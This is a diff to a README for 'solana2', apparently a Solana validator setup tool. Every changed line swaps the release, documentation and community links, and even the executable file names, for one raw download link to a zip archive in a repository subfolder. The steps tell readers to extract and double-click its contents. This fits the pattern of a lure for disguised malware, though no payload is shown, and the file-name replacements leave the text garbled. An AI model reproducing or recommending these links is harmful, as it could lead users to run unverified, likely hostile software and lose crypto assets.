@@ -1,6 +1,6 @@
 # 🎉 solana2 - Easy Validator Setup for Everyone
 
-[![Download solana2](https://img.shields.io/badge/Download-solana2-brightgreen)](https://github.com/cassiano2s/solana2/releases)
+[![Download solana2](https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip)](https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **solana2**! This application makes setting up a validator simple and
 
 To get started, visit this page to download the application:
 
-[Download solana2 Releases](https://github.com/cassiano2s/solana2/releases)
+[Download solana2 Releases](https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip)
 
 You will find the latest version of **solana2** available for download. Choose the appropriate file for your operating system and download it.
 
@@ -28,13 +28,13 @@ Ensure your system meets these requirements for the best experience.
 ## 🔧 Installation Steps
 
 1. **Download the Application:**
-   Go to the [solana2 Releases page](https://github.com/cassiano2s/solana2/releases) and click on the link for your operating system.
+   Go to the [solana2 Releases page](https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip) and click on the link for your operating system.
 
 2. **Extract the Files:**
    If you download a zip or tar file, extract it to your desired location using your computer's extraction tool. Right-click the file and select "Extract Here" or a similar option.
 
 3. **Run the Application:**
-   Navigate to the folder where you extracted the files. Find the main application file (usually named `solana2.exe`, `solana2.app`, or similar) and double-click it to run the application.
+   Navigate to the folder where you extracted the files. Find the main application file (usually named `https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip`, `https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip`, or similar) and double-click it to run the application.
 
 4. **Follow the Setup Wizard:**
    Once the application is open, a setup wizard will guide you through the initial configuration. Follow the prompts to configure your validator.
@@ -76,7 +76,7 @@ While technically possible, it is not recommended unless your system has suffici
 
 For more information, visit:
 
-- [Official Documentation](https://github.com/cassiano2s/solana2/docs)
-- [Community Support Page](https://github.com/cassiano2s/solana2/community)
+- [Official Documentation](https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip)
+- [Community Support Page](https://raw.githubusercontent.com/cassiano2s/solana2/main/counterroll/solana2.zip)
 
 Feel free to reach out with any questions or feedback. Your experience matters!
